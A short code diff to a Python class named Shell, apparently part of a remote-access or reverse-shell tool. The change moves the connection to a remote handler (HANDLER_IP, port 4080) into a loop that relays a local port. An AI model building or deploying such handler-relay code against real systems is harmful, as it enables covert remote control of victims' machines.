@@ -163,13 +163,13 @@ class Shell:
 		self.threads.append(t)
 		
 	def tcp_relay(self):
-		remote_socket = socket.socket()
-		remote_socket.connect((HANDLER_IP,4080))
-		
 		current_thread = threading.currentThread()
 		while not current_thread.stopped():
 			local_socket = socket.socket()
 			local_socket.connect(("127.0.0.1",2080))
+			
+			remote_socket = socket.socket()
+			remote_socket.connect((HANDLER_IP,4080))
 			
 			while not current_thread.stopped():
 				try:
